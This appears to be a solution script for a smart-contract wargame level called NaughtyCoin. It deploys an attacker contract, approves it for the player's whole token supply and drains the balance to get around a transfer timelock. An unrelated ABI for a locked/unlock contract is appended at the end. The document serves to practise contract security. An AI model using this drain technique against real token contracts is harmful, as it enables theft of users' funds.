// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { NaughtyCoin__factory } from "../typechain/ethers-v5";
import { NaughtyCoinAttacker__factory } from "../typechain";

async function main() {
  const instanceAddress = "0xF1071B3034a419dcA0AD5E6fd0CF7bD3571E6b9e";
  const signer = getSigner();
  const coin = NaughtyCoin__factory.connect(instanceAddress, signer);
  await coin.deployed();

  const player = await coin.player();
  const supply = await coin.INITIAL_SUPPLY();
  const balance = await coin.balanceOf(player);
  console.log(`Player: ${player}`);
  console.log(`Supply: ${supply}`);
  console.log(`Balance: ${balance}`);

  console.log("deploy NaughtyCoinAttacker");
  const attacker = await (new NaughtyCoinAttacker__factory(signer)).deploy(instanceAddress);
  await attacker.deployed();
  console.log("attacker:", attacker.address);
  // give attacker the right
  await( await coin.approve(attacker.address, supply)).wait();
  console.log("aprrove done. Now withdraw");
  // attack
  await (await attacker.withdrawAll(balance)).wait();

  console.log("remain balances:", await coin.balanceOf(player));
  console.log("contract balances:", await coin.balanceOf(attacker.address));
  // The goal is to get all balance of player to 0.
  // So we do not care if contract transfer money to other or not.

}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]